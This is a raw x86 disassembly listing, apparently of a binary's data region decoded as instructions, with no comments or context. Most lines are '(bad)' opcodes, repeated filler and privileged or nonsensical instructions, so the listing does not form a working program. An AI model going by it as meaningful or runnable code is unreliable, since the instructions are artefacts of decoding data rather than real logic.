11013b69:	add    BYTE PTR [eax],al
11013b6b:	inc    DWORD PTR [eax]
11013b6d:	add    BYTE PTR [eax],al
11013b6f:	inc    DWORD PTR [eax]
11013b71:	add    BYTE PTR [eax],al
11013b73:	rol    DWORD PTR [eax],0x0
11013b76:	add    BYTE PTR [ecx+0x42000000],al
11013b7c:	add    BYTE PTR [eax],al
11013b7e:	add    BYTE PTR [eax],bl
11013b80:	add    BYTE PTR [eax],al
11013b82:	add    BYTE PTR [esi],al
	...
11013b98:	add    BYTE PTR [eax],al
11013b9a:	add    BYTE PTR [esi],al
11013b9c:	add    BYTE PTR [eax],al
11013b9e:	add    BYTE PTR [ebx],bl
11013ba0:	add    BYTE PTR [eax],al
11013ba2:	add    bh,bh
11013ba4:	inc    esp
11013ba5:	es sbb edi,edi
11013ba8:	adc    cl,BYTE PTR [edx]
11013baa:	push   es
11013bab:	jmp    DWORD PTR [eax]
11013bad:	and    BYTE PTR [eax],ah
11013baf:	(bad)  
11013bb0:	fcmovu st,st(2)
11013bb2:	(bad)  
11013bb4:	(bad)  
11013bb5:	(bad)  
11013bb6:	(bad)  
11013bb7:	(bad)  
11013bb8:	(bad)  
11013bb9:	(bad)  
11013bba:	(bad)  
11013bbb:	(bad)  
11013bbc:	(bad)  
11013bbd:	(bad)  
11013bbe:	(bad)  
11013bbf:	(bad)  
11013bc0:	cld    
11013bc1:	jmp    0xd6fb3ba6
11013bc6:	scas   al,BYTE PTR es:[edi]
11013bc7:	(bad)  
11013bc8:	stc    
11013bc9:	sar    BYTE PTR [ebp-0x38280501],1
11013bcf:	(bad)  
11013bd0:	sti    
11013bd1:	fmul   st,st(1)
11013bd3:	(bad)  
11013bd4:	cli    
11013bd5:	aam    0xc3
11013bd7:	(bad)  
11013bd8:	stc    
11013bd9:	int3   
11013bda:	mov    eax,0xabc3f9ff
11013bdf:	(bad)  
11013be0:	clc    
11013be1:	mov    ecx,0xaff7ff9c
11013be6:	(bad)  
11013be7:	push   esi
11013be9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
11013bea:	cmp    edi,0xfffffff5
11013bed:	mov    al,ds:0x9af5ff79
11013bf2:	jo     0x11013bf3
11013bf4:	hlt    
11013bf5:	xchg   ebp,eax
11013bf6:	push   0xffffffff
11013bf8:	hlt    
11013bf9:	xchg   edx,eax
11013bfa:	gs push esp
11013bfd:	(bad)  
11013bfe:	(bad)  
11013bff:	push   ebx
11013c01:	lea    ebx,[edi-0x1]
11013c04:	repnz mov ebx,DWORD PTR [edi+edi*8-0x10]
11013c09:	xchg   DWORD PTR [ecx-0x1],ebx
11013c0c:	stc    
11013c0d:	(bad)  
11013c0e:	(bad)  
11013c0f:	(bad)  
11013c10:	(bad)  
11013c11:	(bad)  
11013c12:	(bad)  
11013c13:	(bad)  
11013c14:	(bad)  
11013c15:	(bad)  
11013c16:	(bad)  
11013c17:	(bad)  
11013c18:	(bad)  
11013c19:	(bad)  
11013c1a:	std    
11013c1b:	(bad)  
11013c1c:	(bad)  
11013c1e:	fcos   
11013c20:	pop    ds
11013c21:	pop    ds
11013c22:	pop    ds
11013c23:	call   DWORD PTR [ebx]
11013c25:	or     al,BYTE PTR [edi]
11013c27:	inc    DWORD PTR [ebp+0x27]
11013c2a:	sbb    edi,edi
11013c2c:	add    BYTE PTR [eax],al
11013c2e:	add    bh,bh
11013c30:	add    BYTE PTR [eax],al
11013c32:	add    BYTE PTR [esi-0x80000000],bh
11013c38:	add    BYTE PTR [eax],al
11013c3a:	add    BYTE PTR [ecx+0x0],al
11013c3d:	add    BYTE PTR [eax],al
11013c3f:	sbb    BYTE PTR [eax],al
11013c41:	add    BYTE PTR [eax],al
11013c43:	push   es
	...
11013c58:	add    BYTE PTR [eax],al
11013c5a:	add    BYTE PTR [esi],al
11013c5c:	add    BYTE PTR [eax],al
11013c5e:	add    BYTE PTR [eax],bl
11013c60:	add    BYTE PTR [eax],al
11013c62:	add    bh,bh
11013c64:	jb     0x11013ca6
11013c66:	sub    bh,bh
11013c68:	mov    cl,0x64
11013c6a:	inc    ecx
11013c6b:	call   DWORD PTR [ecx]
11013c6d:	or     DWORD PTR [esi],eax
11013c6f:	jmp    DWORD PTR [eax]
11013c71:	and    BYTE PTR [eax],ah
11013c73:	(bad)  
11013c74:	fcmovnu st,st(3)
11013c76:	(bad)  
11013c78:	(bad)  
11013c79:	(bad)  
11013c7a:	std    
11013c7b:	(bad)  
11013c7c:	(bad)  
11013c7d:	(bad)  
11013c7e:	(bad)  
11013c7f:	(bad)  
11013c80:	(bad)  
11013c81:	(bad)  
11013c82:	(bad)  
11013c83:	(bad)  
11013c84:	cld    
11013c85:	jecxz  0x11013c5f
11013c87:	(bad)  
11013c88:	clc    
11013c89:	lds    ebp,FWORD PTR [esi-0x48340601]
11013c8f:	(bad)  
11013c90:	stc    
11013c91:	into   
11013c92:	mov    ebx,0xb8ccf9ff
11013c97:	(bad)  
11013c98:	stc    
11013c99:	(bad)  
11013c9a:	scas   eax,DWORD PTR es:[edi]
11013c9b:	(bad)  
11013c9c:	clc    
11013c9d:	mov    esi,0xb5f7ffa4
11013ca2:	xchg   edi,eax
11013ca3:	push   esi
11013ca5:	lods   al,BYTE PTR ds:[esi]
11013ca6:	mov    bh,bh
11013ca8:	mul    BYTE PTR [edi+edi*2+0x769ef5ff]
11013caf:	push   ebp
11013cb1:	cwde   
11013cb2:	outs   dx,BYTE PTR ds:[esi]
11013cb3:	push   esp
11013cb5:	xchg   esp,eax
11013cb6:	push   0x6391f4ff
11013cbb:	push   esp
11013cbd:	mov    fs,WORD PTR [eax-0x1]
11013cc0:	repz mov WORD PTR [ebp-0x1],ds
11013cc4:	repz mov WORD PTR [esi-0x1],ds
11013cc8:	cli    
11013cc9:	int    0xb9
11013ccb:	(bad)  
11013ccc:	(bad)  
11013ccd:	(bad)  
11013cce:	std    
11013ccf:	(bad)  
11013cd0:	(bad)  
11013cd1:	(bad)  
11013cd2:	(bad)  
11013cd3:	(bad)  
11013cd4:	(bad)  
11013cd5:	(bad)  
11013cd6:	std    
11013cd7:	(bad)  
11013cd8:	fcmovu st,st(2)
11013cda:	fcos   
11013cdc:	pop    ds
11013cdd:	pop    ds
11013cde:	pop    ds
11013cdf:	call   DWORD PTR [ecx]
11013ce1:	or     al,BYTE PTR [esi]
11013ce3:	push   DWORD PTR [edx+0x72ff4265]
11013ce9:	inc    eax
11013cea:	sub    bh,bh
11013cec:	add    BYTE PTR [eax],al
11013cee:	add    bh,bh
11013cf0:	add    BYTE PTR [eax],al
11013cf2:	add    BYTE PTR [esi+0x7f000000],bh
11013cf8:	add    BYTE PTR [eax],al
11013cfa:	add    BYTE PTR [ecx+0x0],al
11013cfd:	add    BYTE PTR [eax],al
11013cff:	sbb    BYTE PTR [eax],al
11013d01:	add    BYTE PTR [eax],al
11013d03:	push   es
	...
11013d18:	add    BYTE PTR [eax],al
11013d1a:	add    BYTE PTR [esi],al
11013d1c:	add    BYTE PTR [eax],al
11013d1e:	add    BYTE PTR [eax],bl
11013d20:	add    BYTE PTR [eax],al
11013d22:	add    bh,bh
11013d24:	ja     0x11013d69
11013d26:	sub    al,0xff
11013d28:	call   0xc30093b0
11013d2d:	fs inc ecx
11013d2f:	call   DWORD PTR [edx]
11013d31:	or     al,BYTE PTR [esi]
11013d33:	call   FWORD PTR [esi]
11013d35:	push   ds
11013d36:	push   ds
11013d37:	(bad)  
11013d38:	fcmovnu st,st(3)
11013d3a:	(bad)  
11013d3c:	(bad)  
11013d3d:	(bad)  
11013d3e:	(bad)  
11013d3f:	(bad)  
11013d40:	(bad)  
11013d41:	(bad)  
11013d42:	(bad)  
11013d43:	(bad)  
11013d44:	(bad)  
11013d45:	(bad)  
11013d46:	(bad)  
11013d47:	(bad)  
11013d48:	cld    
11013d49:	jmp    0xd3fb3d2e
11013d4e:	stos   BYTE PTR es:[edi],al
11013d4f:	(bad)  
11013d50:	clc    
11013d51:	shl    BYTE PTR [edi-0x59400701],0xff
11013d58:	clc    
11013d59:	mov    ebx,0xb5f7ffa0
11013d5e:	cwde   
11013d5f:	push   edi
11013d61:	scas   al,BYTE PTR es:[edi]
11013d62:	(bad)  
11013d63:	push   esi
11013d65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
11013d66:	cmp    edi,0xfffffff5
11013d69:	mov    al,ds:0x9af5ff7a
11013d6e:	jno    0x11013d6f
11013d70:	hlt    
11013d71:	xchg   ebp,eax
11013d72:	push   0xffffffff
11013d74:	hlt    
11013d75:	xchg   edx,eax
11013d76:	gs push esp
11013d79:	(bad)  
11013d7a:	popa   
11013d7b:	push   ebx
11013d7d:	lea    ebx,[edi-0x1]
11013d80:	cmc    
11013d81:	xchg   esp,eax
11013d82:	push   0xc8d8fbff
11013d87:	(bad)  
11013d88:	(bad)  
11013d89:	(bad)  
11013d8a:	(bad)  
11013d8b:	(bad)  
11013d8c:	(bad)  
11013d8d:	(bad)  
11013d8e:	(bad)  
11013d8f:	(bad)  
11013d90:	(bad)  
11013d91:	(bad)  
11013d92:	(bad)  
11013d93:	(bad)  
11013d94:	fcmovu st,st(2)
11013d96:	(bad)  
11013d98:	sbb    eax,0x13ff1d1d
11013d9d:	or     eax,DWORD PTR [edi]
11013d9f:	push   DWORD PTR [edx-0x1700bd9b]
11013da5:	adc    BYTE PTR [esi-0x1],0x77
11013da9:	inc    ebx
11013daa:	sub    al,0xff
11013dac:	add    BYTE PTR [eax],al
11013dae:	add    bh,bh
11013db0:	add    BYTE PTR [eax],al
11013db2:	add    BYTE PTR [esi+0x7f000000],bh
11013db8:	add    BYTE PTR [eax],al
11013dba:	add    BYTE PTR [ecx+0x0],al
11013dbd:	add    BYTE PTR [eax],al
11013dbf:	sbb    BYTE PTR [eax],al
11013dc1:	add    BYTE PTR [eax],al
11013dc3:	push   es
	...
11013dd8:	add    BYTE PTR [eax],al
11013dda:	add    BYTE PTR [esi],al
11013ddc:	add    BYTE PTR [eax],al
11013dde:	add    BYTE PTR [eax],bl
11013de0:	add    BYTE PTR [eax],al
11013de2:	add    bh,bh
11013de4:	jns    0x11013e2a
11013de6:	sub    eax,0x5987f0ff
11013deb:	jmp    edi
11013ded:	adc    BYTE PTR [esi-0x1],0xb0
11013df1:	arpl   WORD PTR [ecx-0x1],ax
11013df4:	adc    cl,BYTE PTR [edx]
11013df6:	push   es
11013df7:	jmp    DWORD PTR [eax]
11013df9:	and    BYTE PTR [eax],ah
11013dfb:	(bad)  
11013dfc:	fcmovu st,st(2)
11013dfe:	(bad)  
11013e00:	(bad)  
11013e01:	(bad)  
11013e02:	(bad)  
11013e03:	(bad)  
11013e04:	(bad)  
11013e05:	(bad)  
11013e06:	std    
11013e07:	(bad)  
11013e08:	(bad)  
11013e09:	(bad)  
11013e0a:	(bad)  
11013e0b:	(bad)  
11013e0c:	std    
11013e0d:	div    dl
11013e0f:	(bad)  
11013e10:	cli    
11013e11:	sar    BYTE PTR [ebp-0x6a4b0801],1
11013e17:	push   esi
11013e19:	scas   al,BYTE PTR es:[edi]
11013e1a:	mov    ?,edi
11013e1c:	imul   BYTE PTR [edx-0x5a090078]
11013e22:	cmp    edi,0xff79a0f5
11013e28:	cmc    
11013e29:	fwait
11013e2a:	jb     0x11013e2b
11013e2c:	hlt    
11013e2d:	xchg   esi,eax
11013e2e:	ins    BYTE PTR es:[edi],dx
11013e2f:	push   esp
11013e31:	xchg   edx,eax
11013e32:	push   sp
11013e35:	(bad)  
11013e36:	(bad)  
11013e37:	push   esp
11013e39:	xchg   ecx,eax
11013e3a:	fs (bad) 
11013e3c:	clc    
11013e3d:	mov    bh,0x99
11013e3f:	(bad)  
11013e40:	std    
11013e41:	icebp  
11013e42:	jmp    0x11013e43
11013e44:	(bad)  
11013e45:	(bad)  
11013e46:	std    
11013e47:	(bad)  
11013e48:	(bad)  
11013e49:	(bad)  
11013e4a:	(bad)  
11013e4b:	(bad)  
11013e4c:	(bad)  
11013e4d:	(bad)  
11013e4e:	(bad)  
11013e4f:	(bad)  
11013e50:	(bad)  
11013e52:	fcos   
11013e54:	and    BYTE PTR [edi],bl
11013e56:	pop    ds
11013e57:	call   DWORD PTR [ebx]
11013e59:	or     eax,DWORD PTR [edi]
11013e5b:	push   DWORD PTR [edx-0x1800bd9c]
11013e61:	adc    BYTE PTR [esi-0x1],0xf0
11013e65:	xchg   DWORD PTR [ecx-0x1],ebx
11013e68:	jns    0x11013eae
11013e6a:	sub    eax,0xff
11013e6f:	inc    DWORD PTR [eax]
11013e71:	add    BYTE PTR [eax],al
11013e73:	mov    esi,0x7f000000
11013e78:	add    BYTE PTR [eax],al
11013e7a:	add    BYTE PTR [ecx+0x0],al
11013e7d:	add    BYTE PTR [eax],al
11013e7f:	sbb    BYTE PTR [eax],al
11013e81:	add    BYTE PTR [eax],al
11013e83:	push   es
	...
11013e98:	add    BYTE PTR [eax],al
11013e9a:	add    BYTE PTR [esi],al
11013e9c:	add    BYTE PTR [eax],al
11013e9e:	add    BYTE PTR [eax],bl
11013ea0:	add    BYTE PTR [eax],al
11013ea2:	add    bh,bh
11013ea4:	jp     0x11013eeb
11013ea6:	sub    eax,0x5a89f3ff
11013eab:	push   eax
11013ead:	xchg   DWORD PTR [ecx-0x1],ebx
11013eb0:	out    0x82,eax
11013eb2:	push   esi
11013eb3:	push   DWORD PTR [ecx+0x11ff4164]
11013eb9:	or     al,BYTE PTR [esi]
11013ebb:	jmp    DWORD PTR [eax]
11013ebd:	and    BYTE PTR [eax],ah
11013ebf:	(bad)  
11013ec0:	fcmovnu st,st(3)
11013ec2:	(bad)  
11013ec4:	(bad)  
11013ec5:	(bad)  
11013ec6:	std    
11013ec7:	(bad)  
11013ec8:	(bad)  
11013ec9:	(bad)  
11013eca:	(bad)  
11013ecb:	(bad)  
11013ecc:	(bad)  
11013ecd:	(bad)  
11013ece:	(bad)  
11013ecf:	(bad)  
11013ed0:	(bad)  
11013ed1:	(bad)  
11013ed2:	std    
11013ed3:	(bad)  
11013ed4:	std    
11013ed5:	hlt    
11013ed6:	lock (bad) 
11013ed8:	sti    
11013ed9:	xlat   BYTE PTR ds:[ebx]
11013eda:	(bad)  
11013edb:	(bad)  
11013edc:	stc    
11013edd:	mov    esi,0xabf7ffa3
11013ee2:	mov    bh,bh
11013ee4:	neg    BYTE PTR [esi-0x640a0089]
11013eea:	jb     0x11013eeb
11013eec:	mul    BYTE PTR [ecx-0x4e070085]
11013ef2:	xchg   ecx,eax
11013ef3:	(bad)  
11013ef4:	cli    
11013ef5:	int    0xb8
11013ef7:	(bad)  
11013ef8:	std    
11013ef9:	icebp  
11013efa:	jmp    0x11013efb
11013efc:	(bad)  
11013efd:	(bad)  
11013efe:	std    
11013eff:	(bad)  
11013f00:	(bad)  
11013f01:	(bad)  
11013f02:	std    
11013f03:	(bad)  
11013f04:	std    
11013f05:	std    
11013f06:	std    
11013f07:	(bad)  
11013f08:	(bad)  
11013f09:	(bad)  
11013f0a:	(bad)  
11013f0b:	(bad)  
11013f0c:	fcmovu st,st(2)
11013f0e:	(bad)  
11013f10:	and    BYTE PTR [eax],ah
11013f12:	pop    ds
11013f13:	call   DWORD PTR [edx]
11013f15:	or     al,BYTE PTR [esi]
11013f17:	push   DWORD PTR [edx-0x1800bd9b]
11013f1d:	adc    BYTE PTR [esi-0x1],0xf0
11013f21:	xchg   DWORD PTR [ecx-0x1],ebx
11013f24:	xrelease mov DWORD PTR [edx-0x1],ebx
11013f28:	jns    0x11013f6e
11013f2a:	sub    eax,0xff
11013f2f:	inc    DWORD PTR [eax]
11013f31:	add    BYTE PTR [eax],al
11013f33:	mov    esi,0x7f000000
11013f38:	add    BYTE PTR [eax],al
11013f3a:	add    BYTE PTR [ecx+0x0],al
11013f3d:	add    BYTE PTR [eax],al
11013f3f:	sbb    BYTE PTR [eax],al
11013f41:	add    BYTE PTR [eax],al
11013f43:	push   es
	...
11013f58:	add    BYTE PTR [eax],al
11013f5a:	add    BYTE PTR [esi],al
11013f5c:	add    BYTE PTR [eax],al
11013f5e:	add    BYTE PTR [eax],bl
11013f60:	add    BYTE PTR [eax],al
11013f62:	add    bh,bh
11013f64:	jp     0x11013fab
11013f66:	sub    eax,0x5a89f3ff
11013f6b:	push   ebx
11013f6d:	mov    DWORD PTR [edx-0x1],ebx
11013f70:	lock xchg DWORD PTR [ecx-0x1],ebx
11013f74:	call   0xc30095fc
11013f79:	fs inc ecx
11013f7b:	call   DWORD PTR [edx]
11013f7d:	or     al,BYTE PTR [esi]
11013f7f:	call   FWORD PTR [esi]
11013f81:	push   ds
11013f82:	push   ds
11013f83:	(bad)  
11013f84:	fcmovnu st,st(3)
11013f86:	(bad)  
11013f88:	(bad)  
11013f89:	(bad)  
11013f8a:	(bad)  
11013f8b:	(bad)  
11013f8c:	(bad)  
11013f8d:	(bad)  
11013f8e:	std    
11013f8f:	(bad)  
11013f90:	std    
11013f91:	std    
11013f92:	std    
11013f93:	(bad)  
11013f94:	(bad)  
11013f95:	(bad)  
11013f96:	std    
11013f97:	(bad)  
11013f98:	(bad)  
11013f99:	(bad)  
11013f9a:	std    
11013f9b:	(bad)  
11013f9c:	(bad)  
11013f9d:	(bad)  
11013f9e:	std    
11013f9f:	(bad)  
11013fa0:	std    
11013fa1:	std    
11013fa2:	std    
11013fa3:	(bad)  
11013fa4:	(bad)  
11013fa5:	(bad)  
11013fa6:	std    
11013fa7:	(bad)  
11013fa8:	std    
11013fa9:	std    
11013faa:	std    
11013fab:	(bad)  
11013fac:	(bad)  
11013fad:	(bad)  
11013fae:	(bad)  
11013faf:	(bad)  
11013fb0:	(bad)  
11013fb1:	(bad)  
11013fb2:	(bad)  
11013fb3:	(bad)  
11013fb4:	(bad)  
11013fb5:	(bad)  
11013fb6:	(bad)  
11013fb7:	(bad)  
11013fb8:	(bad)  
11013fb9:	(bad)  
11013fba:	std    
11013fbb:	(bad)  
11013fbc:	std    
11013fbd:	std    
11013fbe:	std    
11013fbf:	(bad)  
11013fc0:	(bad)  
11013fc1:	(bad)  
11013fc2:	std    
11013fc3:	(bad)  
11013fc4:	std    
11013fc5:	std    
11013fc6:	std    
11013fc7:	(bad)  
11013fc8:	fcmovu st,st(2)
11013fca:	(bad)  
11013fcc:	sbb    eax,0x13ff1d1d
11013fd1:	or     al,BYTE PTR [edi]
11013fd3:	push   DWORD PTR [edx-0x1700bd9b]
11013fd9:	adc    BYTE PTR [esi-0x1],0xf0
11013fdd:	xchg   DWORD PTR [ecx-0x1],ebx
11013fe0:	xrelease mov DWORD PTR [edx-0x1],ebx
11013fe4:	xrelease mov DWORD PTR [edx-0x1],ebx
11013fe8:	jns    0x1101402e
11013fea:	sub    eax,0xff
11013fef:	inc    DWORD PTR [eax]
11013ff1:	add    BYTE PTR [eax],al
11013ff3:	mov    ebp,0x7f000000
11013ff8:	add    BYTE PTR [eax],al
11013ffa:	add    BYTE PTR [ecx+0x0],al
11013ffd:	add    BYTE PTR [eax],al
11013fff:	sbb    BYTE PTR [eax],al
11014001:	add    BYTE PTR [eax],al
11014003:	push   es
	...
11014018:	add    BYTE PTR [eax],al
1101401a:	add    BYTE PTR [esi],al
1101401c:	add    BYTE PTR [eax],al
1101401e:	add    BYTE PTR [eax],bl
11014020:	add    BYTE PTR [eax],al
11014022:	add    bh,bh
11014024:	jp     0x1101406b
11014026:	sub    eax,0x5a89f3ff
1101402b:	push   ebx
1101402d:	mov    DWORD PTR [edx-0x1],ebx
11014030:	xrelease mov DWORD PTR [edx-0x1],ebx
11014034:	lock xchg DWORD PTR [ecx-0x1],ebx
11014038:	out    0x82,eax
1101403a:	push   esi
1101403b:	push   DWORD PTR [eax+0x12ff4163]
11014041:	or     al,BYTE PTR [esi]
11014043:	jmp    DWORD PTR [eax]
11014045:	and    BYTE PTR [eax],ah
11014047:	(bad)  
11014048:	fcmovu st,st(2)
1101404a:	(bad)  
1101404c:	(bad)  
1101404d:	(bad)  
1101404e:	(bad)  
1101404f:	(bad)  
11014050:	std    
11014051:	std    
11014052:	std    
11014053:	(bad)  
11014054:	(bad)  
11014055:	(bad)  
11014056:	std    
11014057:	(bad)  
11014058:	(bad)  
11014059:	(bad)  
1101405a:	(bad)  
1101405b:	(bad)  
1101405c:	(bad)  
1101405d:	(bad)  
1101405e:	std    
1101405f:	(bad)  
11014060:	(bad)  
11014061:	(bad)  
11014062:	(bad)  
11014063:	(bad)  
11014064:	(bad)  
11014065:	(bad)  
11014066:	(bad)  
11014067:	(bad)  
11014068:	(bad)  
11014069:	(bad)  
1101406a:	std    
1101406b:	(bad)  
1101406c:	(bad)  
1101406d:	(bad)  
1101406e:	(bad)  
1101406f:	(bad)  
11014070:	(bad)  
11014071:	(bad)  
11014072:	(bad)  
11014073:	(bad)  
11014074:	(bad)  
11014075:	(bad)  
11014076:	(bad)  
11014077:	(bad)  
11014078:	(bad)  
11014079:	(bad)  
1101407a:	std    
1101407b:	(bad)  
1101407c:	std    
1101407d:	std    
1101407e:	std    
1101407f:	(bad)  
11014080:	(bad)  
11014081:	(bad)  
11014082:	(bad)  
11014083:	(bad)  
11014084:	(bad)  
11014086:	fcos   
11014088:	pop    ds
11014089:	pop    ds
1101408a:	pop    ds
1101408b:	call   DWORD PTR [ebx]
1101408d:	or     al,BYTE PTR [edi]
1101408f:	push   DWORD PTR [edx-0x1800bd9c]
11014095:	adc    BYTE PTR [esi-0x1],0xf0
11014099:	xchg   DWORD PTR [ecx-0x1],ebx
1101409c:	xrelease mov DWORD PTR [edx-0x1],ebx
110140a0:	xrelease mov DWORD PTR [edx-0x1],ebx
110140a4:	xrelease mov DWORD PTR [edx-0x1],ebx
110140a8:	jns    0x110140ee
110140aa:	sub    eax,0xff
110140af:	inc    DWORD PTR [eax]
110140b1:	add    BYTE PTR [eax],al
110140b3:	mov    ecx,0x7d000000
110140b8:	add    BYTE PTR [eax],al
110140ba:	add    BYTE PTR [eax+0x0],al
110140bd:	add    BYTE PTR [eax],al
110140bf:	sbb    BYTE PTR [eax],al
110140c1:	add    BYTE PTR [eax],al
110140c3:	push   es
	...
110140d8:	add    BYTE PTR [eax],al
110140da:	add    BYTE PTR ds:0x16000000,al
110140e0:	add    BYTE PTR [eax],al
110140e2:	add    bh,bh
110140e4:	jp     0x1101412b
110140e6:	sub    eax,0x5a89f3ff
110140eb:	push   ebx
110140ed:	mov    DWORD PTR [edx-0x1],ebx
110140f0:	xrelease mov DWORD PTR [edx-0x1],ebx
110140f4:	xrelease mov DWORD PTR [edx-0x1],ebx
110140f8:	lock xchg DWORD PTR [ecx-0x1],ebx
110140fc:	out    0x82,eax
110140fe:	push   esi
110140ff:	push   DWORD PTR [ecx+0x11ff4164]
11014105:	or     DWORD PTR [esi],eax
11014107:	jmp    DWORD PTR [eax]
11014109:	and    BYTE PTR [eax],ah
1101410b:	(bad)  
1101410c:	fcmovnu st,st(3)
1101410e:	(bad)  
11014110:	(bad)  
11014111:	(bad)  
11014112:	std    
11014113:	(bad)  
11014114:	(bad)  
11014115:	(bad)  
11014116:	std    
11014117:	(bad)  
11014118:	(bad)  
11014119:	(bad)  
1101411a:	(bad)  
1101411b:	(bad)  
1101411c:	(bad)  
1101411d:	(bad)  
1101411e:	std    
1101411f:	(bad)  
11014120:	(bad)  
11014121:	(bad)  
11014122:	std    
11014123:	(bad)  
11014124:	(bad)  
11014125:	(bad)  
11014126:	(bad)  
11014127:	(bad)  
11014128:	std    
11014129:	std    
1101412a:	std    
1101412b:	(bad)  
1101412c:	(bad)  
1101412d:	(bad)  
1101412e:	std    
1101412f:	(bad)  
11014130:	(bad)  
11014131:	(bad)  
11014132:	std    
11014133:	(bad)  
11014134:	(bad)  
11014135:	(bad)  
11014136:	(bad)  
11014137:	(bad)  
11014138:	(bad)  
11014139:	(bad)  
1101413a:	(bad)  
1101413b:	(bad)  
1101413c:	std    
1101413d:	std    
1101413e:	std    
1101413f:	(bad)  
11014140:	fcmovu st,st(2)
11014142:	(bad)  
11014144:	and    BYTE PTR [edi],bl
11014146:	pop    ds
11014147:	call   DWORD PTR [ecx]
11014149:	or     al,BYTE PTR [esi]
1101414b:	push   DWORD PTR [edx-0x1800bd9b]
11014151:	adc    BYTE PTR [esi-0x1],0xf0
11014155:	xchg   DWORD PTR [ecx-0x1],ebx
11014158:	xrelease mov DWORD PTR [edx-0x1],ebx
1101415c:	xrelease mov DWORD PTR [edx-0x1],ebx
11014160:	xrelease mov DWORD PTR [edx-0x1],ebx
11014164:	xrelease mov DWORD PTR [edx-0x1],ebx
11014168:	jns    0x110141ae
1101416a:	sub    eax,0xff
1101416f:	inc    DWORD PTR [eax]
11014171:	add    BYTE PTR [eax],al
11014173:	lods   al,BYTE PTR ds:[esi]
11014174:	add    BYTE PTR [eax],al
11014176:	add    BYTE PTR [ebx+0x0],dh
11014179:	add    BYTE PTR [eax],al
1101417b:	cmp    eax,DWORD PTR [eax]
1101417d:	add    BYTE PTR [eax],al
1101417f:	push   ss
11014180:	add    BYTE PTR [eax],al
11014182:	add    BYTE PTR ds:0x0,al
	...
11014198:	add    BYTE PTR [eax],al
1101419a:	add    BYTE PTR [eax+eax*1],al
1101419d:	add    BYTE PTR [eax],al
1101419f:	adc    al,BYTE PTR [eax]
110141a1:	add    BYTE PTR [eax],al
110141a3:	(bad)  
110141a4:	jp     0x110141eb
110141a6:	sub    eax,0x5a89f3ff
110141ab:	push   ebx
110141ad:	mov    DWORD PTR [edx-0x1],ebx
110141b0:	xrelease mov DWORD PTR [edx-0x1],ebx
110141b4:	xrelease mov DWORD PTR [edx-0x1],ebx
110141b8:	xrelease mov DWORD PTR [edx-0x1],ebx
110141bc:	lock xchg DWORD PTR [ecx-0x1],ebx
110141c0:	call   0xc3009848
110141c5:	fs inc ecx
110141c7:	call   DWORD PTR [edx]
110141c9:	or     al,BYTE PTR [esi]
110141cb:	call   FWORD PTR [esi]
110141cd:	push   ds
110141ce:	push   ds
110141cf:	(bad)  
110141d0:	fcmovnu st,st(3)
110141d2:	(bad)  
110141d4:	(bad)  
110141d5:	(bad)  
110141d6:	std    
110141d7:	(bad)  
110141d8:	(bad)  
110141d9:	(bad)  
110141da:	std    
110141db:	(bad)  
110141dc:	(bad)  
110141dd:	(bad)  
110141de:	std    
110141df:	(bad)  
110141e0:	(bad)  
110141e1:	(bad)  
110141e2:	std    
110141e3:	(bad)  
110141e4:	(bad)  
110141e5:	(bad)  
110141e6:	std    
110141e7:	(bad)  
110141e8:	std    
110141e9:	std    
110141ea:	std    
110141eb:	(bad)  
110141ec:	(bad)  
110141ed:	(bad)  
110141ee:	(bad)  
110141ef:	(bad)  
110141f0:	(bad)  
110141f1:	(bad)  
110141f2:	std    
110141f3:	(bad)  
110141f4:	(bad)  
110141f5:	(bad)  
110141f6:	(bad)  
110141f7:	(bad)  
110141f8:	(bad)  
110141f9:	(bad)  
110141fa:	std    
110141fb:	(bad)  
110141fc:	fcmovu st,st(2)
110141fe:	fcos   
11014200:	sbb    eax,0x13ff1d1d
11014205:	or     eax,DWORD PTR [edi]
11014207:	push   DWORD PTR [edx-0x1700bd9b]
1101420d:	adc    BYTE PTR [esi-0x1],0xf0
11014211:	xchg   DWORD PTR [ecx-0x1],ebx
11014214:	xrelease mov DWORD PTR [edx-0x1],ebx
11014218:	xrelease mov DWORD PTR [edx-0x1],ebx
1101421c:	xrelease mov DWORD PTR [edx-0x1],ebx
11014220:	xrelease mov DWORD PTR [edx-0x1],ebx
11014224:	xrelease mov DWORD PTR [edx-0x1],ebx
11014228:	jns    0x1101426e
1101422a:	sub    eax,0xff
1101422f:	inc    DWORD PTR [eax]
11014231:	add    BYTE PTR [eax],al
11014233:	lea    eax,[eax]
11014235:	add    BYTE PTR [eax],al
11014237:	pop    edi
11014238:	add    BYTE PTR [eax],al
1101423a:	add    BYTE PTR [ecx],dh
1101423c:	add    BYTE PTR [eax],al
1101423e:	add    BYTE PTR [edx],dl
11014240:	add    BYTE PTR [eax],al
11014242:	add    BYTE PTR [eax+eax*1],al
	...
11014259:	add    BYTE PTR [eax],al
1101425b:	add    eax,DWORD PTR [eax]
1101425d:	add    BYTE PTR [eax],al
1101425f:	or     al,0x0
11014261:	add    BYTE PTR [eax],al
11014263:	(bad)  
11014264:	cmp    eax,0x7aff1622
11014269:	inc    ebp
1101426a:	sub    eax,0x2d457aff
1101426f:	(bad)  
11014270:	jp     0x110142b7
11014272:	sub    eax,0x2d457aff
11014277:	(bad)  
11014278:	jp     0x110142bf
1101427a:	sub    eax,0x2d4479ff
1101427f:	push   DWORD PTR [edi+0x43]
11014282:	sub    al,0xff
11014284:	jb     0x110142c6
11014286:	sub    bh,bh
11014288:	inc    esp
11014289:	es sbb edi,edi
1101428c:	add    BYTE PTR [eax],al
1101428e:	add    bh,bh
11014290:	and    BYTE PTR [eax],ah
11014292:	and    bh,bh
11014294:	fcmovu st,st(2)
11014296:	(bad)  
11014298:	(bad)  
11014299:	(bad)  
1101429a:	(bad)  
1101429b:	(bad)  
1101429c:	std    
1101429d:	std    
1101429e:	std    
1101429f:	(bad)  
110142a0:	std    
110142a1:	std    
110142a2:	std    
110142a3:	(bad)  
110142a4:	(bad)  
110142a5:	(bad)  
110142a6:	std    
110142a7:	(bad)  
110142a8:	std    
110142a9:	std    
110142aa:	std    
110142ab:	(bad)  
110142ac:	(bad)  
110142ad:	(bad)  
110142ae:	std    
110142af:	(bad)  
110142b0:	(bad)  
110142b1:	(bad)  
110142b2:	(bad)  
110142b3:	(bad)  
110142b4:	(bad)  
110142b5:	(bad)  
110142b6:	(bad)  
110142b7:	(bad)  
110142b8:	(bad)  
110142ba:	fcos   
110142bc:	pop    ds
110142bd:	pop    ds
110142be:	pop    ds
110142bf:	inc    DWORD PTR [eax]
